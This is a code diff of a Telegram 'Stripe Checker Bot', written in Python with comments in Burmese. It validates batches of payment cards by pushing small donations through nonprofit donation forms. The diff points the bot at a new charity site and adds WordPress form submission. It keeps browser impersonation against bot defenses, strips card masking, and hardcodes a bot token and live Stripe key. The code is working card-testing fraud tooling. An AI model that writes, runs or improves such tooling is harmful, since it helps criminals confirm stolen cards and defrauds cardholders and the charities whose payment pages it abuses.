@@ -6,20 +6,30 @@ import time
 import re
 import os
 import io
+import sys
+import logging
 from datetime import datetime
 from curl_cffi.requests import AsyncSession
 from telegram import Update, Bot
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.error import Conflict, NetworkError
 
 # ═══════════════════════════════════════════════════════
 #  CONFIG
 # ═══════════════════════════════════════════════════════
 BOT_TOKEN = "8775997110:AAHOKmR0uyBiPQWcUD_BSf0NKrzbcaYD7pM"
-MAX_CONCURRENT = 2       # တစ်ပြိုင်နက် စစ်ဆေးနိုင်သော အရေအတွက်
-DELAY_BETWEEN = (3, 6)   # Card တစ်ခုနဲ့တစ်ခုကြား delay (seconds)
+MAX_CONCURRENT = 2       
+DELAY_BETWEEN = (3, 6)   
+
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # ═══════════════════════════════════════════════════════
-#  BROWSER HEADERS (DataDome bypass အတွက် လိုအပ်)
+#  BROWSER HEADERS
 # ═══════════════════════════════════════════════════════
 PAGE_HEADERS = {
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -57,6 +67,7 @@ def extract_csrf(html):
         r'content="([^"]+)"[^>]*name="csrf-token"',
         r'authenticity_token.*?value="([^"]+)"',
         r'"csrf_token":"([^"]+)"',
+        r'name="wpfs-nonce" value="([^"]+)"',
     ]
     for pat in patterns:
         m = re.search(pat, html)
@@ -69,21 +80,7 @@ def extract_stripe_key(html):
     m = re.search(r'pk_live_[A-Za-z0-9]+', html)
     if m:
         return m.group(0)
-    return 'pk_live_GWQnyoQBA8QSySDV4tPMyOgI'
-
-
-def extract_page_ids(html):
-    ids = {}
-    m = re.search(r'"donation_page_context_id"\s*:\s*"([a-f0-9-]{36})"', html)
-    ids['donation_page_context_id'] = m.group(1) if m else 'd2ec45c5-4fae-4521-93cf-790c255a2c7c'
-
-    m = re.search(r'"donation_page_context_type"\s*:\s*"([^"]+)"', html)
-    ids['donation_page_context_type'] = m.group(1) if m else 'Campaign'
-
-    m = re.search(r'"nonprofit_id"\s*:\s*"([a-f0-9-]{36})"', html)
-    ids['nonprofit_id'] = m.group(1) if m else '5d50ec0d-ceef-4dd8-acdc-d827f24b7429'
-
-    return ids
+    return 'pk_live_51KT2RvLSYBr599jmUYDUirjEvD3cu9kWKRQ6uJdleVILixsGu9vAl6gyT375v9hbm3GNAYU5rHg94eYLl4HEG77H004qAfe7Cc'
 
 
 # ═══════════════════════════════════════════════════════
@@ -123,10 +120,10 @@ async def check_card(full, session):
         full_name = f"{first_name} {last_name}"
         mail = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@gmail.com"
 
-        # ─── Step 1: Visit donation page (with full browser headers) ───
+        # ─── Step 1: Visit donation page ───
         try:
             r1 = await session.get(
-                'https://secure.givelively.org/donate/sertoma-inc/hearing-aid-project',
+                'https://glowforhopenfp.org/donate/',
                 headers=PAGE_HEADERS,
                 timeout=30
             )
@@ -139,82 +136,9 @@ async def check_card(full, session):
         if 'captcha' in r1.text.lower() or 'geo.captcha-delivery' in r1.text.lower():
             return "Captcha Block ⚠️"
 
-        csrf_token = extract_csrf(r1.text)
-        if not csrf_token:
-            return "CSRF token not found ⚠️"
-
-        page_ids = extract_page_ids(r1.text)
         stripe_key = extract_stripe_key(r1.text)
-
-        api_headers = {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json',
-            'X-CSRF-Token': csrf_token,
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-        }
-
-        # ─── Step 2: Create cart ───
-        cart_data = {
-            'cart_owner': 'default',
-            'order_tracking_attributes': {
-                'utm_source': None,
-                'widget_type': False,
-                'widget_url': False,
-                'referrer_url': 'https://hearingaiddonations.org/',
-                'page_url': None,
-            },
-            'ref_id': None,
-            'donation_page_context_id': page_ids['donation_page_context_id'],
-            'donation_page_context_type': page_ids['donation_page_context_type'],
-            'items_attributes': [{
-                'amount': 100,
-                'recurring': False,
-                'anonymous_to_public': False,
-                'nonprofit_id': page_ids['nonprofit_id'],
-                'dedication_attributes': {
-                    'name': '',
-                    'email': '',
-                    'type': '',
-                }
-            }]
-        }
-
-        try:
-            r2 = await session.post(
-                'https://secure.givelively.org/carts',
-                headers=api_headers,
-                json=cart_data,
-                timeout=30
-            )
-        except Exception as e:
-            return f"Cart request error: {str(e)[:80]}"
-
-        if r2.status_code not in (200, 201):
-            if 'captcha' in r2.text.lower():
-                return "Captcha Block (cart) ⚠️"
-            return f"Cart failed ({r2.status_code})"
-
-        try:
-            cart_resp = r2.json()
-            cart_id = None
-            if 'cart' in cart_resp and isinstance(cart_resp['cart'], dict):
-                cart_id = cart_resp['cart'].get('id')
-            if not cart_id:
-                cart_id = cart_resp.get('id')
-            if not cart_id and 'data' in cart_resp:
-                cart_id = cart_resp['data'].get('id')
-        except (json.JSONDecodeError, AttributeError):
-            return "Cart response parse error ⚠️"
-
-        if not cart_id:
-            return "Cart ID not found ⚠️"
-
-        # ─── Step 3: Create Stripe Payment Method ───
+        
+        # ─── Step 2: Create Stripe Payment Method ───
         stripe_headers = {
             'accept': 'application/json',
             'content-type': 'application/x-www-form-urlencoded',
@@ -259,201 +183,97 @@ async def check_card(full, session):
         if not pm:
             return "Payment Method ID not found ⚠️"
 
-        card_brand = pm_data.get('card', {}).get('brand', 'visa')
-
-        # ─── Step 4: Checkout ───
-        checkout_data = {
-            'checkout': {
-                'name': full_name,
-                'email': mail,
-                'payment_method_id': pm,
-                'payment_method_type': card_brand,
-                'transaction_fee_covered': False,
-                'tip_amount': 0,
-                'order_tracking_attributes': {
-                    'utm_source': None,
-                    'widget_type': False,
-                    'widget_url': False,
-                    'referrer_url': 'https://hearingaiddonations.org/',
-                    'page_url': None,
-                },
-                'donor_information': {
-                    'address': {
-                        'street_address': '123 Main St',
-                        'custom_field': '',
-                        'administrative_area_level_2': 'New York',
-                        'administrative_area_level_1': 'NY',
-                        'postal_code': '10001',
-                    },
-                },
-                'answers_attributes': [],
-            },
-            'anonymous_to_public': False,
-            'donation_page_context_id': page_ids['donation_page_context_id'],
-            'donation_page_context_type': page_ids['donation_page_context_type'],
-            'idempotency_key': str(uuid.uuid4()),
+        # ─── Step 3: Finalize Checkout ───
+        wp_ajax_url = 'https://glowforhopenfp.org/wp-admin/admin-ajax.php'
+        
+        form_key = extract_between(r1.text, 'wpfs-card-holder-email--', '"')
+        if not form_key:
+            form_key = 'ZGI2N2F' 
+            
+        checkout_payload = {
+            'action': 'wpfs_submit_form',
+            'form_key': form_key,
+            'payment_method_id': pm,
+            'email': mail,
+            'full_name': full_name,
+            'amount': 500, # $5.00
+            'recurring': 'false',
+            'cover_fees': 'false'
         }
-
+        
         try:
             r4 = await session.post(
-                f'https://secure.givelively.org/carts/{cart_id}/payment_intents/checkout',
-                headers=api_headers,
-                json=checkout_data,
+                wp_ajax_url,
+                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                data=checkout_payload,
                 timeout=30
             )
+            
+            resp_text = r4.text.lower()
+            if "success" in resp_text:
+                return "Approved ✅"
+            elif "insufficient" in resp_text:
+                return "Insufficient Funds ✅"
+            elif "incorrect_cvc" in resp_text or "security code is incorrect" in resp_text:
+                return "Incorrect CVC ✅"
+            elif "requires_action" in resp_text or "3d_secure" in resp_text or "authenticate" in resp_text:
+                return "3DS Required ✅"
+            else:
+                try:
+                    resp_json = r4.json()
+                    if resp_json.get('requires_action') or resp_json.get('data', {}).get('requires_action'):
+                        return "3DS Required ✅"
+                    error_msg = resp_json.get('data', {}).get('message', r4.text[:50])
+                    return f"Declined ❌ {error_msg}"
+                except:
+                    return f"Declined ❌ {r4.text[:50]}"
+                    
         except Exception as e:
-            return f"Checkout request error: {str(e)[:80]}"
-
-        resp_text = r4.text
-
-        if 'captcha' in resp_text.lower() or 'geo.captcha-delivery' in resp_text:
-            return "Captcha Block (checkout) ⚠️"
-
-        try:
-            resp_json = r4.json()
-
-            if 'cart' in resp_json:
-                cart_info = resp_json['cart']
-                if cart_info.get('checked_out_at'):
-                    return "Approved ✅ $1.00"
-
-            if 'payment_intent' in resp_json:
-                pi = resp_json['payment_intent']
-                status = pi.get('status', '')
-                if status == 'requires_action':
-                    return "3DS Required 🔐"
-                elif status == 'succeeded':
-                    return "Approved ✅ $1.00"
-
-            if 'message' in resp_json:
-                msg = resp_json['message']
-                if isinstance(msg, list):
-                    msg = ' '.join(msg)
-                msg_lower = msg.lower()
-                if 'insufficient' in msg_lower:
-                    return "Insufficient Funds 💰 (CCN Live)"
-                elif 'stolen' in msg_lower or 'lost' in msg_lower:
-                    return f"Stolen/Lost Card ❌"
-                elif 'do not honor' in msg_lower:
-                    return "Do Not Honor ❌"
-                elif 'expired' in msg_lower:
-                    return "Expired Card ❌"
-                elif 'incorrect' in msg_lower and 'cvc' in msg_lower:
-                    return "Incorrect CVC ❌ (CCN Live)"
-                elif 'security code' in msg_lower:
-                    return "Security Code Error ❌ (CCN Live)"
-                elif 'restrict' in msg_lower:
-                    return "Restricted Card ❌"
-                elif 'pickup' in msg_lower:
-                    return "Pickup Card ❌"
-                elif 'try again' in msg_lower:
-                    return "Try Again Later ⚠️"
-                return msg[:200]
-
-            if 'error' in resp_json:
-                return f"Error: {str(resp_json['error'])[:200]}"
-
-            return resp_text[:300]
-
-        except json.JSONDecodeError:
-            return resp_text[:300]
+            return f"Checkout error: {str(e)[:80]}"
 
     except Exception as e:
-        return f"Error: {str(e)[:150]}"
+        return f"Error: {str(e)[:80]}"
 
 
 # ═══════════════════════════════════════════════════════
-#  TELEGRAM BOT HANDLERS
+#  TELEGRAM BOT LOGIC
 # ═══════════════════════════════════════════════════════
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome = (
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "  💳 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📌 <b>အသုံးပြုနည်း:</b>\n\n"
-        "1️⃣ <code>.txt</code> ဖိုင်ကို ပို့ပါ\n"
-        "   Format: <code>cc|mm|yyyy|cvv</code>\n"
-        "   (တစ်လိုင်းလျှင် ကတ်တစ်ခု)\n\n"
-        "2️⃣ သို့မဟုတ် ကတ်တစ်ခုတည်းကို\n"
-        "   Message အနေနဲ့ တိုက်ရိုက်ပို့ပါ\n"
-        "   ဥပမာ: <code>4242424242424242|12|2028|123</code>\n\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "📊 <b>Commands:</b>\n"
-        "/start - Bot စတင်ရန်\n"
-        "/help  - အကူအညီ\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📋 <b>Result Types:</b>\n"
-        "✅ Approved - Card Live\n"
-        "💰 Insufficient - CCN Live\n"
-        "🔐 3DS Required - Card Live\n"
-        "❌ Declined - Card Dead\n"
-        "⚠️ Error - စစ်ဆေး၍မရ\n"
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    await update.message.reply_text(welcome, parse_mode='HTML')
-
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = (
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "  ❓ 𝗛𝗲𝗹𝗽\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📄 <b>TXT ဖိုင် Format:</b>\n"
-        "<code>4242424242424242|12|2028|123</code>\n"
-        "<code>5555555555554444|06|2027|456</code>\n\n"
-        "📝 <b>Single Card:</b>\n"
-        "ကတ်တစ်ခုတည်းကို message ပို့ပါ\n\n"
-        "⚡ <b>Features:</b>\n"
-        "• TXT ဖိုင်ပို့ရင် အကုန်စစ်ပေးမယ်\n"
-        "• Live/Dead/Error ခွဲပြပေးမယ်\n"
-        "• စစ်ပြီးရင် Result Summary ပြပေးမယ်\n"
-        "• Live ကတ်တွေကို .txt ဖိုင်နဲ့ ပြန်ပို့ပေးမယ်\n"
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    await update.message.reply_text(help_text, parse_mode='HTML')
-
-
-async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip()
-
-    if "|" not in text:
-        return
-
-    parts = text.split("|")
-    if len(parts) != 4:
-        await update.message.reply_text(
-            "❌ Format မှားနေပါတယ်\n"
-            "✅ မှန်ကန်သော Format: <code>cc|mm|yyyy|cvv</code>",
-            parse_mode='HTML'
-        )
-        return
-
-    processing_msg = await update.message.reply_text(
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"  🔄 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💳 <code>{mask_card(text)}</code>\n"
-        f"⏳ စစ်ဆေးနေပါတယ်...\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━",
+    await update.message.reply_text(
+        "👋 <b>Welcome to Stripe Checker Bot!</b>\n\n"
+        "I can check Stripe cards using <code>glowforhopenfp.org</code>.\n\n"
+        "📝 <b>How to use:</b>\n"
+        "• Send a single card: <code>cc|mm|yyyy|cvv</code>\n"
+        "• Send a .txt file with multiple cards\n\n"
+        "🚀 <i>Version 3.3 Final (Enhanced 3DS)</i>",
         parse_mode='HTML'
     )
 
-    start_time = time.time()
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Just send me your cards in <code>cc|mm|yyyy|cvv</code> format.", parse_mode='HTML')
+
+
+async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    card_line = update.message.text.strip()
+    if "|" not in card_line:
+        return
+
+    status_msg = await update.message.reply_text("⏳ <i>Checking card...</i>", parse_mode='HTML')
+    
     async with AsyncSession(impersonate="chrome") as session:
-        result = await check_card(text, session)
-    elapsed = round(time.time() - start_time, 2)
-
+        result = await check_card(card_line, session)
+    
     status_emoji = get_status_emoji(result)
-    status_label = get_status_label(result)
-
-    await processing_msg.edit_text(
+    label = get_status_label(result)
+    
+    await status_msg.edit_text(
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"  {status_emoji} {status_label}\n"
+        f"  {status_emoji} {label}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💳 Card: <code>{mask_card(text)}</code>\n"
-        f"📋 Result: <b>{result}</b>\n"
-        f"⏱ Time: {elapsed}s\n"
+        f"💳 <code>{card_line}</code>\n"
+        f"📋 {result}\n"
         f"━━━━━━━━━━━━━━━━━━━━━━",
         parse_mode='HTML'
     )
@@ -461,44 +281,28 @@ async def process_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
-
     if not document.file_name.endswith('.txt'):
-        await update.message.reply_text(
-            "❌ <code>.txt</code> ဖိုင်သာ လက်ခံပါတယ်",
-            parse_mode='HTML'
-        )
+        await update.message.reply_text("❌ Please send a .txt file.")
         return
 
     file = await context.bot.get_file(document.file_id)
-    file_bytes = await file.download_as_bytearray()
-    content = file_bytes.decode('utf-8', errors='ignore')
-    lines = [line.strip() for line in content.splitlines() if line.strip() and "|" in line]
+    content = await file.download_as_bytearray()
+    lines = content.decode('utf-8').splitlines()
+    lines = [line.strip() for line in lines if line.strip() and "|" in line]
 
     if not lines:
-        await update.message.reply_text(
-            "❌ ဖိုင်ထဲမှာ ကတ်မတွေ့ပါ\nFormat: <code>cc|mm|yyyy|cvv</code>",
-            parse_mode='HTML'
-        )
+        await update.message.reply_text("❌ No valid cards found in file.")
         return
 
     total = len(lines)
+    checked = 0
+    results = {'live': [], 'dead': [], 'error': []}
 
     status_msg = await update.message.reply_text(
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"  📂 𝗙𝗶𝗹𝗲 𝗟𝗼𝗮𝗱𝗲𝗱\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"📊 Total Cards: <b>{total}</b>\n"
-        f"⏳ Status: <b>Starting...</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━",
+        f"⏳ <b>Starting check...</b>\nTotal: {total}",
         parse_mode='HTML'
     )
 
-    results = {
-        'live': [],
-        'dead': [],
-        'error': [],
-    }
-    checked = 0
     start_time = time.time()
     semaphore = asyncio.Semaphore(MAX_CONCURRENT)
     lock = asyncio.Lock()
@@ -590,26 +394,9 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# ═══════════════════════════════════════════════════════
-#  UTILITY FUNCTIONS
-# ═══════════════════════════════════════════════════════
-
-def mask_card(card_str):
-    try:
-        parts = card_str.split("|")
-        cc = parts[0].strip()
-        if len(cc) >= 8:
-            masked_cc = cc[:6] + "****" + cc[-4:]
-        else:
-            masked_cc = cc
-        return f"{masked_cc}|{parts[1].strip()}|{parts[2].strip()}|***"
-    except (IndexError, ValueError):
-        return card_str
-
-
 def get_status_emoji(result):
     result_str = str(result)
-    if any(kw in result_str for kw in ["Approved", "Insufficient", "3DS", "CCN Live"]):
+    if any(kw in result_str for kw in ["Approved", "Insufficient", "3DS", "CCN Live", "Incorrect CVC"]):
         return "✅"
     elif any(kw in result_str for kw in ["Declined", "Expired", "Do Not Honor"]):
         return "❌"
@@ -625,6 +412,8 @@ def get_status_label(result):
         return "𝗖𝗖𝗡 𝗟𝗜𝗩𝗘"
     elif "3DS" in result_str:
         return "𝟯𝗗𝗦 𝗟𝗜𝗩𝗘"
+    elif "Incorrect CVC" in result_str:
+        return "𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗖𝗩𝗖"
     elif any(kw in result_str for kw in ["Declined", "Do Not Honor"]):
         return "𝗗𝗘𝗔𝗗"
     else:
@@ -638,26 +427,29 @@ def create_progress_bar(current, total, length=10):
     return f"[{bar}] {percent}%"
 
 
-# ═══════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════
-
 def main():
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("  💳 Stripe Checker Bot v3.0")
-    print("  Starting...")
+    print("  💳 Stripe Checker Bot v3.3")
+    print("  Status: Enhanced 3DS Detection")
     print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
-    app = Application.builder().token(BOT_TOKEN).build()
+    try:
+        app = Application.builder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(MessageHandler(filters.Document.ALL, process_file))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_single_card))
+        app.add_handler(CommandHandler("start", start_command))
+        app.add_handler(CommandHandler("help", help_command))
+        app.add_handler(MessageHandler(filters.Document.ALL, process_file))
+        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_single_card))
 
-    print("  Bot is running!")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    app.run_polling(drop_pending_updates=True)
+        print("  Bot is running!")
+        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        
+        app.run_polling(drop_pending_updates=True, stop_signals=None)
+        
+    except Conflict:
+        print("❌ Error: Conflict! Another instance is running.")
+    except Exception as e:
+        print(f"❌ Critical Error: {e}")
 
 
 if __name__ == "__main__":
